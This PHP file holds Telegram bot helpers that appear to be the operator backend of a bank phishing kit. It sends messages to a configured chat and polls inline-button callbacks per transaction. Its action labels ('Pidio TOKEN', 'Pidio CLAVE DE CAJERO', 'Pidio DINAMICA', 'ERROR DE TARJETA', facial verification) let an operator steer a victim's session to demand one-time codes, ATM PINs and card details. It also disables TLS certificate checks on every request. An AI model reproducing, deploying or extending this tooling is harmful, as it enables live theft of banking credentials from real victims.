<?php
declare(strict_types=1);

if (function_exists('getSharedTelegramConfig')) {
    return;
}

function getSharedTelegramConfig(): array
{
    static $cache = null;
    if ($cache !== null) {
        return $cache;
    }

    $configPath = __DIR__ . '/config.php';
    if (!file_exists($configPath)) {
        throw new RuntimeException('No existe config global de Telegram');
    }

    $raw = require $configPath;
    $token = (string) (getenv('TELEGRAM_BOT_TOKEN') ?: ($raw['telegram_bot_token'] ?? $raw['bot_token'] ?? ''));
    $chatId = (string) (getenv('TELEGRAM_CHAT_ID') ?: ($raw['telegram_chat_id'] ?? $raw['chat_id'] ?? ''));

    if ($token === '' || $chatId === '') {
        throw new RuntimeException('Config vacia (bot_token/chat_id)');
    }

    $cache = [
        'bot_token' => $token,
        'chat_id' => $chatId
    ];

    return $cache;
}

function sendTelegramText(array $options): array
{
    $config = getSharedTelegramConfig();
    $botToken = $options['bot_token'] ?? $config['bot_token'];
    $chatId = $options['chat_id'] ?? $config['chat_id'];
    $text = trim((string) ($options['text'] ?? ''));

    if ($text === '') {
        throw new InvalidArgumentException('Mensaje vacio');
    }

    $payload = [
        'chat_id' => $chatId,
        'text' => $text,
        'parse_mode' => $options['parse_mode'] ?? 'HTML'
    ];

    if (!empty($options['keyboard'])) {
        $payload['reply_markup'] = json_encode(['inline_keyboard' => $options['keyboard']]);
    } elseif (!empty($options['reply_markup'])) {
        $payload['reply_markup'] = $options['reply_markup'];
    }

    if (!empty($options['disable_notification'])) {
        $payload['disable_notification'] = true;
    }

    $ch = curl_init("https://api.telegram.org/bot{$botToken}/sendMessage");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => json_encode($payload),
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false
    ]);
    $response = curl_exec($ch);
    if ($response === false) {
        $err = curl_error($ch);
        curl_close($ch);
        throw new RuntimeException('Error cURL sendMessage: ' . $err);
    }
    curl_close($ch);

    $decoded = json_decode($response, true);
    if (!is_array($decoded)) {
        throw new RuntimeException('Respuesta invalida de Telegram: ' . $response);
    }

    return [
        'ok' => !empty($decoded['ok']),
        'message_id' => !empty($decoded['ok']) ? ($decoded['result']['message_id'] ?? null) : null,
        'response' => $decoded
    ];
}

function ensureTelegramWebhookDisabled(string $botToken): void
{
    static $checked = [];
    if (isset($checked[$botToken])) {
        return;
    }

    $infoUrl = "https://api.telegram.org/bot{$botToken}/getWebhookInfo";
    $ch = curl_init($infoUrl);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_TIMEOUT => 5
    ]);
    $response = curl_exec($ch);
    curl_close($ch);

    $info = json_decode($response, true);
    if (is_array($info) && !empty($info['result']['url'])) {
        $delete = curl_init("https://api.telegram.org/bot{$botToken}/deleteWebhook");
        curl_setopt_array($delete, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_TIMEOUT => 5
        ]);
        curl_exec($delete);
        curl_close($delete);
    }

    $checked[$botToken] = true;
}

function formatTelegramOperator(array $from): string
{
    if (!empty($from['username'])) {
        return '@' . $from['username'];
    }

    $fullName = trim(($from['first_name'] ?? '') . ' ' . ($from['last_name'] ?? ''));
    return $fullName !== '' ? $fullName : 'Operador';
}

function describeTelegramAction(string $action): string
{
    static $map = [
        'error_logo' => 'Marco ERROR DE LOGO',
        'error_tarjeta' => 'Marco ERROR DE TARJETA',
        'error_tc' => 'Redirigio a TARJETA',
        'error_cajero' => 'Marco ERROR DE CAJERO',
        'error_dinamica' => 'Marco ERROR DE DINAMICA',
        'pedir_dinamica' => 'Pidio DINAMICA',
        'pedir_token' => 'Pidio TOKEN',
        'pedir_cajero' => 'Pidio CLAVE DE CAJERO',
        'facial' => 'Redirigio a VERIFICACION FACIAL',
        'error_facial' => 'Marco ERROR FACIAL',
        'sms' => 'Solicito SMS',
        'confirm_finalizar' => 'FINALIZO la operacion',
        'tarjeta' => 'Redirigio a TARJETA'
    ];

    if (isset($map[$action])) {
        return $map[$action];
    }

    $label = strtoupper(str_replace('_', ' ', $action));
    return trim($label) === '' ? 'Accion desconocida' : $label;
}

function buildTelegramSummary(string $baseText, string $label, string $operator): string
{
    $text = $baseText !== '' ? $baseText : 'Operacion en curso';
    $text .= "\n\n--------------------\n";
    $text .= "ACCION: <b>{$label}</b>\n";
    $text .= "OPERADOR: <b>{$operator}</b>";
    return $text;
}

function pollTelegramAction(array $options): ?array
{
    $config = getSharedTelegramConfig();
    $botToken = $options['bot_token'] ?? $config['bot_token'];
    $chatId = $options['chat_id'] ?? $config['chat_id'];
    $transactionId = $options['transactionId'] ?? '';
    if ($transactionId === '') {
        return null;
    }

    $sessionKey = $options['sessionKey'] ?? 'telegram_update_id';
    $messageId = $options['messageId'] ?? null;
    $allowedActions = $options['allowedActions'] ?? null;
    $appendSummary = array_key_exists('appendSummary', $options) ? (bool) $options['appendSummary'] : true;
    $removeKeyboard = array_key_exists('removeKeyboard', $options) ? (bool) $options['removeKeyboard'] : true;

    ensureTelegramWebhookDisabled($botToken);

    $offset = $_SESSION[$sessionKey] ?? 0;
    $url = "https://api.telegram.org/bot{$botToken}/getUpdates?offset=" . ($offset + 1);
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_TIMEOUT => 5
    ]);
    $response = curl_exec($ch);
    if ($response === false) {
        $err = curl_error($ch);
        curl_close($ch);
        throw new RuntimeException('Error cURL getUpdates: ' . $err);
    }
    curl_close($ch);

    $data = json_decode($response, true);
    if (!isset($data['result']) || !is_array($data['result'])) {
        return null;
    }

    $maxUpdateId = $offset;

    foreach ($data['result'] as $update) {
        $updateId = $update['update_id'] ?? 0;
        if ($updateId > $maxUpdateId) {
            $maxUpdateId = $updateId;
        }

        if (!isset($update['callback_query'])) {
            continue;
        }

        $callback = $update['callback_query'];
        $callbackData = $callback['data'] ?? '';
        if ($callbackData === '' || strpos($callbackData, $transactionId) === false) {
            continue;
        }

        [$actionType] = explode(':', $callbackData, 2);
        if ($allowedActions && !in_array($actionType, $allowedActions, true)) {
            continue;
        }

        $_SESSION[$sessionKey] = $updateId;

        $operator = formatTelegramOperator($callback['from'] ?? []);
        $label = describeTelegramAction($actionType);
        $message = $callback['message'] ?? [];
        $originalText = $message['text'] ?? '';
        $targetChatId = $message['chat']['id'] ?? $chatId;
        $targetMessageId = $message['message_id'] ?? $messageId;

        if ($targetMessageId) {
            if ($appendSummary) {
                $newText = buildTelegramSummary($originalText, $label, $operator);
                $payload = [
                    'chat_id' => $targetChatId,
                    'message_id' => $targetMessageId,
                    'text' => $newText,
                    'parse_mode' => 'HTML'
                ];
                if ($removeKeyboard) {
                    $payload['reply_markup'] = json_encode(['inline_keyboard' => []]);
                }

                $editCh = curl_init("https://api.telegram.org/bot{$botToken}/editMessageText");
                curl_setopt_array($editCh, [
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_POST => true,
                    CURLOPT_POSTFIELDS => json_encode($payload),
                    CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
                    CURLOPT_SSL_VERIFYPEER => false,
                    CURLOPT_SSL_VERIFYHOST => false
                ]);
                curl_exec($editCh);
                curl_close($editCh);
            } elseif ($removeKeyboard) {
                $markupPayload = [
                    'chat_id' => $targetChatId,
                    'message_id' => $targetMessageId,
                    'reply_markup' => json_encode(['inline_keyboard' => []])
                ];

                $markupCh = curl_init("https://api.telegram.org/bot{$botToken}/editMessageReplyMarkup");
                curl_setopt_array($markupCh, [
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_POST => true,
                    CURLOPT_POSTFIELDS => json_encode($markupPayload),
                    CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
                    CURLOPT_SSL_VERIFYPEER => false,
                    CURLOPT_SSL_VERIFYHOST => false
                ]);
                curl_exec($markupCh);
                curl_close($markupCh);
            }
        }

        return [
            'action' => $actionType,
            'label' => $label,
            'operator' => $operator
        ];
    }

    if ($maxUpdateId > $offset) {
        $_SESSION[$sessionKey] = $maxUpdateId;
    }

    return null;
}